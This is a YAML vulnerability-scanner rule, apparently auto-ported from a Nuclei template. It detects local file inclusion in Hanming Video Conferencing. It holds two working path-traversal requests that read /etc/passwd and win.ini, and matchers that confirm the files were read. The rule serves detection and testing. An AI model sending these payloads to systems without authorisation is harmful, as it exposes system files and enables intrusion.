schema_version: 1
id: "cortex.community:hanming-lfr"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Hanming Video Conferencing - Local File Inclusion"
  description: "Hanming Video Conferencing is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://mp.weixin.qq.com/s/F-M21PT0xn9QOuwoC8llKA"
  cwes: [22]
  tags: ["lfr", "hanming", "lfi", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini" }
  - id: "probe1"
    request: { method: "GET", path: "/register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd" }
proof:
  kind: "signal.v1"
  assertions:
    any:
      - any:
          - all:
              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "bit app support" } }
              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "fonts" } }
              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "extensions" } }
          - regex: { left: { ref: "steps.probe0.body" }, right: { value: "root:[x*]:0:0:" } }
      - any:
          - all:
              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "bit app support" } }
              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "fonts" } }
              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "extensions" } }
          - regex: { left: { ref: "steps.probe1.body" }, right: { value: "root:[x*]:0:0:" } }
